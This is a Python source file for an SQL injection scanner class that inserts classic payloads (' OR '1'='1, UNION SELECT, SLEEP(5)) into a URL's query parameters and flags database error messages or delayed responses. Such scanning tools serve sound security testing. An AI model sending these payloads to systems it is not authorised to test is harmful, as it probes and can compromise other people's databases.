import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode
from utils.logger import logger

class SQLiScanner:
    def __init__(self):
        self.payloads = [
            "' OR '1'='1",
            "';--",
            '" OR "1"="1',
            "' UNION SELECT NULL--",
            "' AND SLEEP(5)--",
        ]
        self.error_patterns = [
            "mysql_fetch",
            "SQL syntax",
            "You have an error in your SQL",
            "sqlite3.OperationalError",
            "PostgreSQL",
            "ORA-",
            "Microsoft SQL Server",
        ]
        self.results = []

    def scan(self, url):
        self.results = []
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)

        for param in query_params:
            for payload in self.payloads:
                new_params = query_params.copy()
                new_params[param] = payload
                new_query = urlencode(new_params, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"

                try:
                    start_time = time.time()
                    response = requests.get(test_url, timeout=10)
                    elapsed_time = time.time() - start_time
                    logger.debug(f"SQLi: {test_url} - Status: {response.status_code}, Length: {len(response.text)}, Time: {elapsed_time:.2f}s")

                    for error in self.error_patterns:
                        if error.lower() in response.text.lower():
                            finding = {
                                "vulnerability": "SQLi",
                                "url": test_url,
                                "payload": payload,
                                "severity": "critical",
                                "details": f"SQL Injection detected with payload: {payload}. Error pattern: {error}"
                            }
                            self.results.append(finding)
                            logger.info(f"SQLi found: {test_url} with payload: {payload}")
                            break

                    if "SLEEP" in payload and elapsed_time >= 5:
                        finding = {
                            "vulnerability": "SQLi",
                            "url": test_url,
                            "payload": payload,
                            "severity": "critical",
                            "details": f"Blind SQL Injection detected with payload: {payload}. Response delayed by {elapsed_time:.2f}s"
                        }
                        self.results.append(finding)
                        logger.info(f"Blind SQLi found: {test_url} with payload: {payload}")
                except requests.RequestException as e:
                    logger.error(f"Error scanning {test_url} for SQLi: {e}")

        return self.results